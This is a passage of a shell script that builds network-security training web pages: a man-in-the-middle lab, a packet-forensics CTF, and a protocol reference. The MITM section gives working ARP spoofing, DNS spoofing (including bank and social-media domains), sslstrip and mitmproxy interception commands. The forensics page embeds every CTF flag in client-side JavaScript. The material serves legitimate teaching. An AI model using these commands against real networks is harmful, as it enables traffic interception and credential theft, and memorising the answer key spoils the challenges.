            <pre><code><span class="comment"># Watch ARP table changes</span>
watch -n 1 'arp -a'

<span class="comment"># Use arpwatch for monitoring</span>
sudo arpwatch -i eth0

<span class="comment"># Wireshark filter for ARP anomalies</span>
arp.duplicate-address-detected</code></pre>

            <div class="exercise">
                <h4>&#127919; Exercise: ARP Cache Poisoning</h4>
                <ol>
                    <li>Start the isolated environment</li>
                    <li>Check the victim's ARP cache before the attack</li>
                    <li>Perform ARP spoofing from the attacker namespace</li>
                    <li>Verify the victim's ARP cache has been poisoned</li>
                    <li>Capture traffic passing through the attacker</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 2: DNS Spoofing</h2>
            <p>DNS spoofing redirects domain name queries to malicious IP addresses.</p>

            <h3>Setup Local DNS Server</h3>
            <pre><code><span class="comment"># Configure dnsmasq for spoofing (in attacker namespace)</span>
sudo ip netns exec attacker_ns bash

<span class="comment"># Create spoofed DNS entries</span>
cat > /tmp/dns-spoof.conf << EOF
address=/example.com/10.0.0.3
address=/login.bank.com/10.0.0.3
address=/facebook.com/10.0.0.3
EOF

<span class="comment"># Start dnsmasq with spoofed config</span>
dnsmasq --no-daemon --conf-file=/tmp/dns-spoof.conf -i veth-atk</code></pre>

            <h3>Using Ettercap DNS Plugin</h3>
            <pre><code><span class="comment"># Edit /etc/ettercap/etter.dns (backup first)</span>
sudo cp /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak

<span class="comment"># Add spoofed entries</span>
echo "*.example.com A 10.0.0.3" | sudo tee -a /etc/ettercap/etter.dns
echo "login.*.com A 10.0.0.3" | sudo tee -a /etc/ettercap/etter.dns

<span class="comment"># Run ettercap with dns_spoof plugin</span>
sudo ip netns exec attacker_ns ettercap -T -q -i veth-atk -P dns_spoof -M arp:remote /10.0.0.2// /10.0.0.1//</code></pre>

            <div class="tip">
                <strong>&#128161; What to Look For in Wireshark:</strong>
                <ul>
                    <li>Filter: <code>dns</code></li>
                    <li>Look for query responses with unexpected IP addresses</li>
                    <li>Multiple responses to the same query</li>
                    <li>Check response TTL values (spoofed often have short TTLs)</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>Exercise 3: SSL Stripping</h2>
            <p>SSL stripping downgrades HTTPS connections to HTTP, allowing traffic interception.</p>

            <h3>Using sslstrip</h3>
            <pre><code><span class="comment"># Inside attacker namespace</span>
sudo ip netns exec attacker_ns bash

<span class="comment"># Enable IP forwarding</span>
echo 1 > /proc/sys/net/ipv4/ip_forward

<span class="comment"># Redirect HTTP traffic to sslstrip</span>
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 10000

<span class="comment"># Start sslstrip</span>
sslstrip -l 10000 -w /tmp/sslstrip.log

<span class="comment"># In another terminal, ARP spoof to intercept traffic</span>
arpspoof -i veth-atk -t 10.0.0.2 10.0.0.1</code></pre>

            <h3>Using mitmproxy (More Modern)</h3>
            <pre><code><span class="comment"># Start mitmproxy in transparent mode</span>
sudo ip netns exec attacker_ns mitmproxy --mode transparent --showhost

<span class="comment"># Configure iptables to redirect traffic</span>
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080

<span class="comment"># View intercepted requests in mitmproxy interface</span>
<span class="comment"># Press ? for help, q to quit</span></code></pre>

            <div class="warning">
                <strong>Note:</strong> Modern browsers use HSTS (HTTP Strict Transport Security) which prevents SSL stripping for known sites.
                This technique is becoming less effective but is important to understand historically.
            </div>
        </div>

        <div class="section">
            <h2>Exercise 4: HTTPS Interception</h2>
            <p>Intercept HTTPS traffic using a proxy with custom certificates.</p>

            <h3>Generate Certificates</h3>
            <pre><code><span class="comment"># Generate CA certificate (one-time)</span>
openssl genrsa -out ca.key 4096
openssl req -new -x509 -days 365 -key ca.key -out ca.crt \
    -subj "/CN=MITM Lab CA/O=Security Training"

<span class="comment"># The victim would need to install this CA (in a real attack, this is the hard part)</span></code></pre>

            <h3>Using mitmproxy with Custom CA</h3>
            <pre><code><span class="comment"># mitmproxy automatically generates certificates</span>
mitmproxy

<span class="comment"># CA cert location: ~/.mitmproxy/mitmproxy-ca-cert.pem</span>
<span class="comment"># Import this to the victim's browser to avoid warnings</span>

<span class="comment"># Export intercepted data</span>
mitmdump -w /tmp/traffic.mitm</code></pre>

            <div class="exercise">
                <h4>&#127919; Exercise: Traffic Modification</h4>
                <p>Use mitmproxy to modify traffic in real-time:</p>
                <ol>
                    <li>Start mitmproxy in the attacker namespace</li>
                    <li>Configure victim to use attacker as proxy</li>
                    <li>Press 'i' to intercept requests</li>
                    <li>Modify a request/response and forward it</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>Defense Techniques</h2>
            <h3>Detecting MITM Attacks</h3>
            <ul>
                <li><strong>ARP Monitoring:</strong> Use <code>arpwatch</code> to detect ARP cache changes</li>
                <li><strong>Certificate Pinning:</strong> Applications pin expected certificates</li>
                <li><strong>HSTS:</strong> Force HTTPS connections</li>
                <li><strong>DNSSEC:</strong> Cryptographically signed DNS responses</li>
                <li><strong>VPN:</strong> Encrypt all traffic</li>
            </ul>

            <h3>Protection Commands</h3>
            <pre><code><span class="comment"># Static ARP entries (prevents ARP spoofing)</span>
sudo arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

<span class="comment"># Check for duplicate MAC addresses</span>
arp -a | sort | uniq -d

<span class="comment"># Monitor for ARP anomalies</span>
sudo tcpdump -i eth0 arp</code></pre>
        </div>

        <div class="section">
            <h2>Quick Reference</h2>
            <table style="width: 100%; border-collapse: collapse;">
                <tr style="background: rgba(0,0,0,0.3);">
                    <th style="padding: 10px; text-align: left;">Tool</th>
                    <th style="padding: 10px; text-align: left;">Command</th>
                </tr>
                <tr><td style="padding: 8px;">ARP Spoof</td><td style="padding: 8px;"><code>arpspoof -i eth0 -t [victim] [gateway]</code></td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;">Ettercap</td><td style="padding: 8px;"><code>ettercap -T -M arp:remote /victim// /gateway//</code></td></tr>
                <tr><td style="padding: 8px;">mitmproxy</td><td style="padding: 8px;"><code>mitmproxy --mode transparent</code></td></tr>
                <tr style="background: rgba(0,0,0,0.2);"><td style="padding: 8px;">DNS Spoof</td><td style="padding: 8px;"><code>ettercap -P dns_spoof</code></td></tr>
            </table>
        </div>
    </div>
</body>
</html>
MITM_EOF

    log "MITM lab created"
}

#===============================================================================
# Lab 3: Network Forensics Lab (CTF Style)
#===============================================================================

create_forensics_lab() {
    header "Creating Network Forensics Lab"

    cat > "${WEB_ROOT}/forensics-lab/index.html" << 'FORENSICS_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Forensics Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh; color: #e4e4e4; padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #3498db; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #3498db; margin-bottom: 15px; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .comment { color: #8b949e; }
        .challenge {
            background: linear-gradient(135deg, rgba(52,152,219,0.2), rgba(155,89,182,0.2));
            border: 2px solid #3498db;
            border-radius: 15px;
            padding: 25px;
            margin: 25px 0;
        }
        .challenge h3 { color: #3498db; margin-top: 0; }
        .challenge-meta { display: flex; gap: 20px; margin: 15px 0; flex-wrap: wrap; }
        .meta-item { background: rgba(0,0,0,0.3); padding: 5px 15px; border-radius: 20px; font-size: 0.9em; }
        .difficulty-easy { border-left: 4px solid #27ae60; }
        .difficulty-medium { border-left: 4px solid #f39c12; }
        .difficulty-hard { border-left: 4px solid #e74c3c; }
        .hint { background: rgba(241,196,15,0.1); border-left: 4px solid #f1c40f; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; cursor: pointer; }
        .hint-content { display: none; margin-top: 10px; color: #f1c40f; }
        .hint:hover .hint-content { display: block; }
        .flag-submit { margin-top: 20px; }
        .flag-input { background: #0d1117; border: 2px solid #30363d; border-radius: 8px; padding: 12px 20px; color: #fff; font-family: monospace; font-size: 1em; width: 100%; max-width: 500px; }
        .flag-btn { background: #3498db; border: none; color: #fff; padding: 12px 25px; border-radius: 8px; cursor: pointer; font-weight: bold; margin-left: 10px; }
        .flag-btn:hover { background: #2980b9; }
        .download-btn { display: inline-block; background: #27ae60; color: #fff; padding: 10px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 15px; }
        .download-btn:hover { background: #219a52; }
        ul { margin-left: 20px; line-height: 1.8; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128269; Network Forensics Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">CTF-style challenges - Analyze packet captures to find hidden flags!</p>

        <div class="section">
            <h2>Challenge Instructions</h2>
            <ol>
                <li>Download the PCAP file for each challenge</li>
                <li>Analyze it using Wireshark, tshark, or other tools</li>
                <li>Find the hidden flag in format: <code>FLAG{...}</code></li>
                <li>Submit your answer to verify</li>
            </ol>

            <h3>Useful Tools</h3>
            <pre><code><span class="comment"># Open in Wireshark</span>
wireshark challenge1.pcap

<span class="comment"># Quick analysis with tshark</span>
tshark -r challenge1.pcap -Y "http" -T fields -e http.request.uri

<span class="comment"># Extract HTTP objects</span>
tshark -r challenge1.pcap --export-objects http,/tmp/extracted/

<span class="comment"># Follow TCP stream</span>
tshark -r challenge1.pcap -z follow,tcp,ascii,0</code></pre>
        </div>

        <div class="challenge difficulty-easy">
            <h3>&#127919; Challenge 1: The Exfiltrated Password</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128308; Difficulty: Easy</span>
                <span class="meta-item">&#128196; Protocol: HTTP</span>
                <span class="meta-item">&#128202; Points: 100</span>
            </div>
            <p>A user's credentials were intercepted during a login attempt. Find the exfiltrated password hidden in the traffic.</p>

            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Look for HTTP POST requests to login endpoints. The flag is the password value.</div>
            </div>

            <a href="pcaps/challenge1_password.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag1" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(1)">Submit</button>
                <span id="result1"></span>
            </div>
        </div>

        <div class="challenge difficulty-medium">
            <h3>&#127919; Challenge 2: C2 Beacon Identification</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128992; Difficulty: Medium</span>
                <span class="meta-item">&#128196; Protocol: HTTPS/DNS</span>
                <span class="meta-item">&#128202; Points: 200</span>
            </div>
            <p>Malware on a compromised system is beaconing to a Command & Control server. Identify the beacon pattern and find the C2 indicator.</p>

            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Look for repetitive DNS queries or HTTPS connections to unusual domains. Check the port number.</div>
            </div>

            <a href="pcaps/challenge2_c2beacon.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag2" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(2)">Submit</button>
                <span id="result2"></span>
            </div>
        </div>

        <div class="challenge difficulty-medium">
            <h3>&#127919; Challenge 3: FTP File Recovery</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128992; Difficulty: Medium</span>
                <span class="meta-item">&#128196; Protocol: FTP</span>
                <span class="meta-item">&#128202; Points: 200</span>
            </div>
            <p>A secret file was transferred via FTP. Extract the file contents to find the flag.</p>

            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Use "Follow TCP Stream" on the FTP-DATA connection, or export objects from the capture.</div>
            </div>

            <a href="pcaps/challenge3_ftp.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag3" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(3)">Submit</button>
                <span id="result3"></span>
            </div>
        </div>

        <div class="challenge difficulty-hard">
            <h3>&#127919; Challenge 4: DNS Tunneling</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128308; Difficulty: Hard</span>
                <span class="meta-item">&#128196; Protocol: DNS</span>
                <span class="meta-item">&#128202; Points: 300</span>
            </div>
            <p>Data is being exfiltrated through DNS queries. Decode the hidden message.</p>

            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">DNS tunneling encodes data in subdomain names. Look for long, encoded subdomains. Try base64/hex decoding.</div>
            </div>

            <a href="pcaps/challenge4_dns_tunnel.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag4" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(4)">Submit</button>
                <span id="result4"></span>
            </div>
        </div>

        <div class="challenge difficulty-medium">
            <h3>&#127919; Challenge 5: HTTP Session Reconstruction</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128992; Difficulty: Medium</span>
                <span class="meta-item">&#128196; Protocol: HTTP</span>
                <span class="meta-item">&#128202; Points: 250</span>
            </div>
            <p>Reconstruct the HTTP session to understand what the user accessed. The flag is hidden in the response.</p>

            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Export HTTP objects or follow the HTTP stream. Look for hidden comments or headers.</div>
            </div>

            <a href="pcaps/challenge5_http.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag5" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(5)">Submit</button>
                <span id="result5"></span>
            </div>
        </div>

        <div class="challenge difficulty-hard">
            <h3>&#127919; Challenge 6: ICMP Tunneling</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128308; Difficulty: Hard</span>
                <span class="meta-item">&#128196; Protocol: ICMP</span>
                <span class="meta-item">&#128202; Points: 300</span>
            </div>
            <p>Data can be hidden in ICMP echo payloads to bypass firewalls. Analyze the ICMP traffic and extract the hidden data.</p>
            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Look at the data field in ICMP echo packets. The payload may be hex or base64 encoded.</div>
            </div>

            <a href="pcaps/challenge6_icmp_tunnel.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag6" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(6)">Submit</button>
                <span id="result6"></span>
            </div>
        </div>

        <div class="challenge difficulty-hard">
            <h3>&#127919; Challenge 7: SMB Enumeration</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128308; Difficulty: Hard</span>
                <span class="meta-item">&#128196; Protocol: SMB</span>
                <span class="meta-item">&#128202; Points: 300</span>
            </div>
            <p>An attacker enumerated SMB shares during reconnaissance. Analyze the SMB session to find what was discovered.</p>
            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Filter for SMB2 protocol and look at Tree Connect requests. The share names reveal the flag.</div>
            </div>

            <a href="pcaps/challenge7_smb.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag7" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(7)">Submit</button>
                <span id="result7"></span>
            </div>
        </div>

        <div class="challenge difficulty-easy">
            <h3>&#127919; Challenge 8: Telnet Session</h3>
            <div class="challenge-meta">
                <span class="meta-item">&#128994; Difficulty: Easy</span>
                <span class="meta-item">&#128196; Protocol: Telnet</span>
                <span class="meta-item">&#128202; Points: 100</span>
            </div>
            <p>Telnet transmits everything in cleartext. Analyze this captured session to extract login credentials.</p>
            <div class="hint">
                <strong>&#128161; Hint (hover to reveal)</strong>
                <div class="hint-content">Follow the TCP stream on port 23. Look for login prompts and passwords in the cleartext data.</div>
            </div>

            <a href="pcaps/challenge8_telnet.pcap" class="download-btn">&#11015; Download PCAP</a>

            <div class="flag-submit">
                <input type="text" class="flag-input" id="flag8" placeholder="FLAG{...}">
                <button class="flag-btn" onclick="checkFlag(8)">Submit</button>
                <span id="result8"></span>
            </div>
        </div>

        <div class="section">
            <h2>Tshark One-Liner Challenges</h2>
            <p>Practice your command-line packet analysis skills:</p>

            <h3>Challenge A: Extract all HTTP hosts</h3>
            <pre><code>tshark -r capture.pcap -Y "http.request" -T fields -e http.host | sort | uniq -c | sort -rn</code></pre>

            <h3>Challenge B: Find all DNS queries</h3>
            <pre><code>tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | sort | uniq</code></pre>

            <h3>Challenge C: Extract credentials from HTTP POST</h3>
            <pre><code>tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data</code></pre>

            <h3>Challenge D: Find large data transfers</h3>
            <pre><code>tshark -r capture.pcap -q -z conv,tcp | sort -k 6 -n -r | head -10</code></pre>

            <h3>Challenge E: Protocol hierarchy</h3>
            <pre><code>tshark -r capture.pcap -q -z io,phs</code></pre>
        </div>

        <div class="section">
            <h2>Zeek/Bro Log Analysis</h2>
            <p>Process pcaps with Zeek for structured logs:</p>

            <pre><code><span class="comment"># Process a pcap with Zeek</span>
zeek -r capture.pcap

<span class="comment"># This generates log files:</span>
ls *.log
<span class="comment"># conn.log - Connection records</span>
<span class="comment"># dns.log  - DNS queries</span>
<span class="comment"># http.log - HTTP requests</span>
<span class="comment"># files.log - File transfers</span>

<span class="comment"># Query Zeek logs</span>
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto | sort | uniq -c | sort -rn

<span class="comment"># Find HTTP requests</span>
cat http.log | zeek-cut host uri method status_code

<span class="comment"># Find DNS queries</span>
cat dns.log | zeek-cut query answers</code></pre>
        </div>

        <div class="tip">
            <strong>&#128161; Pro Tips:</strong>
            <ul>
                <li>Use <code>Statistics > Conversations</code> in Wireshark to see all connections</li>
                <li>Right-click a packet and "Follow Stream" to see full conversation</li>
                <li>Use <code>File > Export Objects</code> to extract transferred files</li>
                <li>Check for hidden data in packet payloads using hex view</li>
            </ul>
        </div>
    </div>

    <script>
    const flags = {
        1: 'FLAG{p4ssw0rd_3xf1ltr4t10n_d3t3ct3d}',
        2: 'FLAG{c2_b34c0n_1d3nt1f13d_443}',
        3: 'FLAG{ftp_f1l3_r3c0v3r3d_s3cr3t}',
        4: 'FLAG{dns_tunn3l_d4t4_3xtr4ct3d}',
        5: 'FLAG{http_s3ss10n_r3c0nstruct3d}',
        6: 'FLAG{1cmp_tunn3l_d4t4_h1dd3n}',
        7: 'FLAG{smb_sh4r3_3num3r4t3d}',
        8: 'FLAG{t3ln3t_cr3ds_c4ptur3d}'
    };

    function checkFlag(num) {
        const input = document.getElementById('flag' + num).value.trim();
        const result = document.getElementById('result' + num);
        if (input === flags[num]) {
            result.innerHTML = ' <span style="color: #27ae60;">&#10004; Correct!</span>';
        } else {
            result.innerHTML = ' <span style="color: #e74c3c;">&#10008; Incorrect</span>';
        }
    }
    </script>
</body>
</html>
FORENSICS_EOF

    log "Forensics lab created"
}

#===============================================================================
# Lab 4: Protocol Deep-Dive Lab
#===============================================================================

create_protocol_lab() {
    header "Creating Protocol Deep-Dive Lab"

    cat > "${WEB_ROOT}/protocol-lab/index.html" << 'PROTOCOL_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protocol Deep-Dive Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%); min-height: 100vh; color: #e4e4e4; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { color: #1abc9c; margin-bottom: 10px; }
        .back-link { color: #00d9ff; text-decoration: none; margin-bottom: 20px; display: inline-block; }
        .section { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; padding: 25px; margin: 20px 0; }
        h2 { color: #1abc9c; margin-bottom: 15px; border-bottom: 2px solid #1abc9c; padding-bottom: 10px; }
        h3 { color: #f39c12; margin: 20px 0 10px; }
        pre { background: #0d1117; border: 1px solid #30363d; border-radius: 8px; padding: 15px; overflow-x: auto; font-family: monospace; }
        code { color: #58a6ff; }
        .filter-box { background: #1a1a2e; border: 2px solid #1abc9c; border-radius: 8px; padding: 15px; margin: 15px 0; }
        .filter-box code { color: #1abc9c; font-size: 1.1em; }
        .diagram { background: #0d1117; padding: 20px; border-radius: 10px; font-family: monospace; margin: 20px 0; overflow-x: auto; }
        .diagram pre { background: none; border: none; color: #00d9ff; }
        .exercise { background: rgba(52,152,219,0.2); border-left: 4px solid #3498db; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        .tip { background: rgba(46,204,113,0.2); border-left: 4px solid #2ecc71; padding: 15px; margin: 15px 0; border-radius: 0 8px 8px 0; }
        ul { margin-left: 20px; line-height: 1.8; }
        table { width: 100%; border-collapse: collapse; margin: 15px 0; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #333; }
        th { background: rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <a href="../" class="back-link">&larr; Back to Labs</a>
        <h1>&#128202; Protocol Deep-Dive Lab</h1>
        <p style="color: #888; margin-bottom: 20px;">Understand network protocols at the packet level</p>

        <div class="section">
            <h2>TCP Three-Way Handshake</h2>
            <div class="diagram">
                <pre>
    Client                              Server
      |                                   |
      |  -------- SYN (seq=100) ------->  |  Step 1: Client initiates
      |                                   |
      |  <-- SYN-ACK (seq=300,ack=101) -- |  Step 2: Server responds
      |                                   |
      |  -------- ACK (ack=301) ------->  |  Step 3: Client confirms
      |                                   |
      |  ======= CONNECTION OPEN =======  |
                </pre>
            </div>

            <h3>Wireshark Filters</h3>
            <div class="filter-box">
                <code>tcp.flags.syn == 1 && tcp.flags.ack == 0</code> - SYN packets only
            </div>
            <div class="filter-box">
                <code>tcp.flags.syn == 1 && tcp.flags.ack == 1</code> - SYN-ACK packets
            </div>
            <div class="filter-box">
                <code>tcp.flags == 0x012</code> - SYN-ACK (hex flags)
            </div>

            <h3>Generate and Capture</h3>
            <pre><code># Terminal 1: Start capture
sudo tcpdump -i lo -w /tmp/handshake.pcap 'port 8080'

# Terminal 2: Start simple server
nc -l 8080

# Terminal 3: Connect as client
nc localhost 8080

# Type something, then Ctrl+C both. Analyze:
wireshark /tmp/handshake.pcap</code></pre>

            <div class="exercise">
                <h4>Exercise: Identify Handshake Stages</h4>
                <ol>
                    <li>Capture a TCP connection to port 80</li>
                    <li>Identify the SYN, SYN-ACK, ACK sequence</li>
                    <li>Note the sequence and acknowledgment numbers</li>
                    <li>What's the initial window size offered?</li>
                </ol>
            </div>
        </div>

        <div class="section">
            <h2>HTTP vs HTTPS Traffic</h2>

            <h3>HTTP Traffic (Unencrypted)</h3>
            <div class="filter-box">
                <code>http</code> - All HTTP traffic
            </div>
            <div class="filter-box">
                <code>http.request.method == "GET"</code> - GET requests
            </div>
            <div class="filter-box">
                <code>http.request.method == "POST"</code> - POST requests
            </div>

            <h3>HTTPS/TLS Traffic (Encrypted)</h3>
            <div class="filter-box">
                <code>tls</code> - All TLS traffic
            </div>
            <div class="filter-box">
                <code>tls.handshake.type == 1</code> - Client Hello
            </div>
            <div class="filter-box">
                <code>tls.handshake.type == 2</code> - Server Hello
            </div>

            <h3>TLS Handshake Flow</h3>
            <div class="diagram">
                <pre>
    Client                                    Server
      |                                         |
      | -- Client Hello (ciphers, random) --->  |
      |                                         |
      | <-- Server Hello (chosen cipher) -----  |
      | <-- Certificate -----------------------  |
      | <-- Server Hello Done ----------------  |
      |                                         |
      | -- Client Key Exchange --------------> |
      | -- Change Cipher Spec --------------->  |
      | -- Finished (encrypted) ------------->  |
      |                                         |
      | <-- Change Cipher Spec ---------------  |
      | <-- Finished (encrypted) -------------  |
      |                                         |
      | ====== ENCRYPTED APPLICATION DATA ==== |
                </pre>
            </div>

            <div class="tip">
                <strong>What You CAN See in HTTPS:</strong>
                <ul>
                    <li>Server Name Indication (SNI) - domain being accessed</li>
                    <li>Certificate information</li>
                    <li>Cipher suite negotiated</li>
                    <li>Packet sizes and timing</li>
                </ul>
                <strong>What You CANNOT See:</strong>
                <ul>
                    <li>URLs/paths</li>
                    <li>HTTP headers</li>
                    <li>Request/response body</li>
                </ul>
            </div>
        </div>

        <div class="section">
            <h2>DNS Protocol</h2>
            <div class="diagram">
                <pre>
                DNS Query Structure
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
                </pre>
            </div>

            <h3>DNS Filters</h3>
            <div class="filter-box">
                <code>dns</code> - All DNS traffic
            </div>
            <div class="filter-box">
                <code>dns.qry.name contains "google"</code> - Queries for google
            </div>
            <div class="filter-box">
                <code>dns.flags.response == 0</code> - Queries only
            </div>
            <div class="filter-box">
                <code>dns.flags.response == 1</code> - Responses only
            </div>

            <h3>DNS Record Types</h3>
            <table>
                <tr><th>Type</th><th>Code</th><th>Description</th></tr>
                <tr><td>A</td><td>1</td><td>IPv4 address</td></tr>
                <tr><td>AAAA</td><td>28</td><td>IPv6 address</td></tr>
                <tr><td>CNAME</td><td>5</td><td>Canonical name (alias)</td></tr>
                <tr><td>MX</td><td>15</td><td>Mail exchanger</td></tr>
                <tr><td>TXT</td><td>16</td><td>Text record</td></tr>
                <tr><td>NS</td><td>2</td><td>Name server</td></tr>
                <tr><td>PTR</td><td>12</td><td>Reverse lookup</td></tr>
            </table>
        </div>

        <div class="section">
            <h2>ICMP Protocol</h2>
            <h3>Common ICMP Types</h3>
            <table>
                <tr><th>Type</th><th>Name</th><th>Description</th></tr>
                <tr><td>0</td><td>Echo Reply</td><td>Ping response</td></tr>
                <tr><td>3</td><td>Destination Unreachable</td><td>Various codes for why</td></tr>
                <tr><td>5</td><td>Redirect</td><td>Route redirect</td></tr>
                <tr><td>8</td><td>Echo Request</td><td>Ping request</td></tr>
                <tr><td>11</td><td>Time Exceeded</td><td>TTL expired (traceroute)</td></tr>
            </table>

            <h3>ICMP Filters</h3>
            <div class="filter-box">
                <code>icmp</code> - All ICMP traffic
            </div>
            <div class="filter-box">
                <code>icmp.type == 8</code> - Echo requests (pings)
            </div>
            <div class="filter-box">
                <code>icmp.type == 0</code> - Echo replies
            </div>
            <div class="filter-box">
                <code>icmp.type == 3</code> - Destination unreachable
            </div>
        </div>

        <div class="section">
            <h2>ARP Protocol</h2>
            <div class="diagram">
                <pre>
    ARP Request: "Who has 192.168.1.1? Tell 192.168.1.100"

    Host A (192.168.1.100)                Router (192.168.1.1)
         |                                      |
         |  -- ARP Request (broadcast) -------> |
         |     dst: ff:ff:ff:ff:ff:ff           |
         |     "Who has 192.168.1.1?"           |
         |                                      |
         |  <-- ARP Reply (unicast) ----------- |
         |     "192.168.1.1 is at aa:bb:cc..."  |
         |                                      |

    Host A now caches: 192.168.1.1 -> aa:bb:cc:dd:ee:ff
                </pre>
            </div>

            <h3>ARP Filters</h3>
            <div class="filter-box">
                <code>arp</code> - All ARP traffic
            </div>
            <div class="filter-box">
                <code>arp.opcode == 1</code> - ARP requests
            </div>
            <div class="filter-box">
                <code>arp.opcode == 2</code> - ARP replies
            </div>
            <div class="filter-box">
                <code>arp.duplicate-address-detected</code> - Possible spoofing
            </div>
        </div>

        <div class="section">
            <h2>Useful Compound Filters</h2>
            <div class="filter-box">
                <code>ip.addr == 192.168.1.100 && tcp.port == 80</code>
            </div>
            <div class="filter-box">
                <code>!(arp or icmp or dns)</code> - Exclude noise
            </div>
            <div class="filter-box">
                <code>tcp.analysis.retransmission</code> - Find retransmits
            </div>
            <div class="filter-box">
                <code>frame.time_delta > 1</code> - Delays over 1 second
            </div>
        </div>
    </div>
</body>
</html>
PROTOCOL_EOF

    log "Protocol lab created"
}

#===============================================================================
# Lab 5: Active Reconnaissance Lab
#===============================================================================

create_recon_lab() {
    header "Creating Reconnaissance Lab"

    cat > "${WEB_ROOT}/recon-lab/index.html" << 'RECON_EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Active Reconnaissance Lab</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
